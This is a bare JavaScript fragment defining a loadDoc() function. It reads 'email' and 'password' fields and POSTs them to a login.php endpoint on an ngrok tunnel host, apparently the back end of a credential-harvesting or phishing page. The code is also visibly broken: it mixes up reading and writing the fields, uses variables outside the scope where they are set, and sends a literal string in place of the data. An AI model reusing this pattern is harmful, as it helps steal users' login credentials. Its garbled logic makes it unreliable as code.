<script>

  function loadDoc() {
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
      if (this.readyState == 4 && this.status == 200) {
       
        var a = document.getElementById("email").innerHTML = this.responseText;
                
        var b = document.getElementById("password").innerHTML = this.responseText;
      }
    };
    xhr.open("POST", "https://7b0af6f0.ngrok.io/acm/login.php", true);
    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    data = {uniqueid: a, password: b};
    xhr.send("data");
  }
</script>
